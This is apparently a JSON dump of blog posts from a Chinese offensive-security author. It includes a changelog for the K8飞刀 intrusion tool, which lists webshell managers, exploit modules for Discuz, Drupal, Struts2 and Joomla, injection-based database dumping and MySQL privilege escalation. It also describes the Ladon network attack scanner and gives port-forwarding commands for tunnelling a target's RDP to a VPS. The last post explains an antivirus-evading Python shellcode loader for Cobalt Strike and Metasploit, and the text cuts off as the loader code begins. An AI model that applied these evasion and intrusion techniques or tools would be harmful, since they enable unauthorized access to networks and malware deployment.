XSS挂马流量分析系统 未完成.. 静请期待&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP-Chr连接字符串(点号 +号)互转 WebShell常用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141123[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(WebShell\\PHP\\JSP\\ASP\\ASPX大量字典)&nbsp;&nbsp; 20141120=================================================================================K8飞刀 20141111 光棍专版[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加Banner/IP/地址位置信息 美化各项配置属性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141110[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复不能读取配置文件长字符串的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141107[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动保存当前脱库配置信息/重起程序后自动加载&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP不显示脱库速度/多线程脱库时不能停止的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注入点脱库(多线程) + 计算脱库速度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141104[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 多行字符串 转成 C# StringBuffer代码 开发用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相对路径生成 Discuz 6.x/7.x代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103=================================================================================K8飞刀 20141101[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码多行转一行 Bat逻辑命令符转成一行与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP/2003 工具栏图标按钮位置调整&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Big5(HK)编码,修复脱库时HK繁体乱码的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键添加发送到DataOutput模块功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加robots.txt查看按钮(大部分网站都会有的)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030[+]ExpDebug/Exploit&nbsp;&nbsp; 禁用掉错误提示脚本&nbsp; 添加Discuz 7.2 相关EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141029[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台PHP-Chr连接字符串 GetShell代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP GetShell代码 PHP-Chr连接字符串生成与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面直观 (工具栏/右键菜单/Tab头)添加相应图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141025[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台 (PHP Filter)模块GetShell 代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持导入20141022版本前数据库(提示新增EXP数量)&nbsp;&nbsp;&nbsp;&nbsp; 20141022[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exploit-DB模块 新增自定义 网址 附加URL 参数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hex编码(GB2312\\UTF8\\Unicode)&nbsp; Hex解码GB2312&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141019[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入 Hex文件路径(MSSQL) Hex文件路径(Mysql)&nbsp;&nbsp;&nbsp;&nbsp; 20141018[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面&nbsp; 编辑框只留一个&nbsp; 加密算法全放置右键菜单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; drupal 7.31 SQL注入漏洞 EXP (测试 7.12 7.31)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 国庆花一天 弄K8工具当年常用时尚透明皮肤(.Net)&nbsp;&nbsp;&nbsp;&nbsp; 20141005[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加数据库(Oracle MYSQL MSSQL)4种CHAR格式解密&nbsp;&nbsp;&nbsp;&nbsp; 20140925[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 所有文本框 右键菜单增加 转大小写 转全半角功能&nbsp;&nbsp;&nbsp;&nbsp; 20140920[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加/修改WebShell 增加高级模式&nbsp; 默认简易模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140908[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Delphi互转其它代码用到&nbsp; 赋值 := 互转 =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 各语言代码常用 转义字符双引号&nbsp; \\\" 互转 \"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824[+]CheckUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检测最否有最新版 提示编译日期并打开URL地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140818[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 脱库模块 SQL注入点脱库 也可用于WebFuzzing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140814[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 执行EXP&nbsp; 提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复浏览器模式提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 Zimbra LFI 0day exploit 本地包含漏洞&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140812[+]FileManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellManage右键文件管理模块-PHP列目录完成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 路径常用符号互转 /转\\\\&nbsp; \\\\转/&nbsp; /转\\&nbsp; \\转/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811=================================================================================K8飞刀 20140810[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加节日提醒 (公历节日、农历节日)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140810[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Perl Cmd WebShell&nbsp;&nbsp;&nbsp; (Perl一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140807[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Cmd WebShell&nbsp; (Python一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140806[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion Cmd WebShell (CFM一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 合并数据库(支持导入菜刀数据库) 进行管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 WebShell 添加/修改提示对象已释放Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 WebShell 判断是否已存在 不重复添加&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805=================================================================================K8飞刀 20140731[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Apache Struts2 S2-020 GetShell EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 空格转%20 空格转/**/(Struts2漏洞用到)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加已存在EXP 会提示EXP对应按扭名称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 允许添加修改 EXP按钮名称较长字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS Escape默认加密与全部加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 FromCharCode专用ASCII码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS转义 (16进制/Unicode)字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 HTML实体编码(10进制/16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728=================================================================================K8飞刀 20140725[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加18个Fckeditor 19个Joomla 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Discuz! 7.2 faq.php 注入 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tipask 2.0 ajaxsearch URL编码注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串转Unicode Unicode转字符串 SHA1加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHA加密算法系列 (SHA256 SHA384 SHA512)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键增加导入合并其它数据库的EXP数据功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64 支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键删除增加是否删除提示,免得误删Shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140720[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键EXP按钮可删除和修改当前按钮对应EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140716[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 动态创建按钮加载对应Payload,生成漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140714[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键添加EXP到Web_Exploit模块数据库功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; None模式(只浏览网页不提交任何数据)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711=================================================================================K8飞刀 20140707[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cookie格式不对,提交闪退的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140707[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换HEX编码(16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换CHR编码(ASC码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 伪造 HTTP Referer (请求来源)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140626[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent 自定义编辑&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140608[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent修复(之前版本忘了加了)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140423=================================================================================[+]之前的 回忆过去,痛苦的相思忘不了.","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"}]},{"title":"Ladon Scanner For Python","slug":"Ladon Scanner For Python","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-18T11:50:28.850Z","comments":true,"path":"p/dcb670e3.html","link":"","permalink":"http://k8gege.org/p/dcb670e3.html","excerpt":"","text":"Ladon Scanner For Python PyLadon目前python版功能较少,无论在Windows还是Linux系统性能以及速度均也比不上Ladon.exe唯一的优点是跨平台,后续会添加相关功能，缺点也明显py打包程序很大，不太适合在目标使用 程序简介Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。 使用说明 ID 主题 URL 1 Ladon文档主页 https://github.com/k8gege/Ladon/wiki 2 基础用法详解 https://github.com/k8gege/Ladon/wiki/Ladon-Usage 3 Cobalt Strike https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike 4 Exp生成器使用 https://github.com/k8gege/Ladon/wiki/LadonExp-Usage 5 高度自定义插件 https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle 6 外部模块参考 https://github.com/k8gege/K8CScan/wiki 7 PowerLadon https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell 8 PythonLadon https://github.com/k8gege/PyLadon 9 LinuxLadon https://github.com/k8gege/LinuxLadon 10 漏洞演示视频 https://github.com/k8gege/K8CScan/tree/master/Video","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/categories/Ladon/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/categories/Python/"},{"name":"源码","slug":"Code","permalink":"http://k8gege.org/categories/Code/"},{"name":"编程","slug":"Program","permalink":"http://k8gege.org/categories/Program/"}],"tags":[{"name":"Ladon","slug":"Ladon","permalink":"http://k8gege.org/tags/Ladon/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Python","slug":"Python","permalink":"http://k8gege.org/tags/Python/"}]},{"title":".NET端口转发工具PortTran","slug":"PortTran端口转发工具.Net版","date":"2019-12-02T16:00:00.000Z","updated":"2020-06-11T16:20:39.861Z","comments":true,"path":"p/3f55538f.html","link":"","permalink":"http://k8gege.org/p/3f55538f.html","excerpt":"","text":"0x001 简介 PortTran by k8gege.NET版端口转发工具，支持任意权限下转发 0x002 背景工具在2016年左右写的，当时某个内网不知何原故LCX用不了 由于Win2003才刚停更不久，依然有不少内网还是03的机器 加上.NET版的兼容性均没LCX好，所以我自己也很少用... 以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统 .net程序不用慌了，体积小和易于免杀大家都开心了。 0x003 用法 0x001 VPS监听 PortTranS.exe 8000 338 0x002 目标内网转发PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000 0x003 VPS连接3389mstsc /console /v:127.0.0.1:338 &nbsp;0x004 实例 1.vps监听 2.目标内网3389端口转发 3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了 不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口 就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来 再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。 0x005 下载 https://github.com/k8gege/PortTran &nbsp;","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":".NET","slug":"Dotnet","permalink":"http://k8gege.org/categories/Dotnet/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"PortTran","slug":"PortTran","permalink":"http://k8gege.org/tags/PortTran/"}]},{"title":"Python免杀ShellCode加载器(Cobalt Strike/Metasploit)","slug":"Python免杀Cobaltstrike原理与实现","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:17:16.024Z","comments":true,"path":"p/f3512dbc.html","link":"","permalink":"http://k8gege.org/p/f3512dbc.html","excerpt":"","text":"0x001 原理 采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。 本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。 PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。 如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。 再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？ 0x002 ShellCode免杀 CS可生成很多种格式的ShellCode，具体该用哪一种呢？ 由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。 其实不用测都知道HEX字串肯定比RAW或标准C格式安全。 因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。 当然实际上使用任意格式都可以，前提是需要加解密。 下面我们拿CS3.13的ShellCode来做个对比，结果如下 CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635将CS的ShellCode转成Hex无一杀软查杀(hex.txt)http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d 0x003 加载器 以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单 缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。 其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解 ScRunHex.py #scrun by k8gege import ctypes import sys #calc.exe #sc = 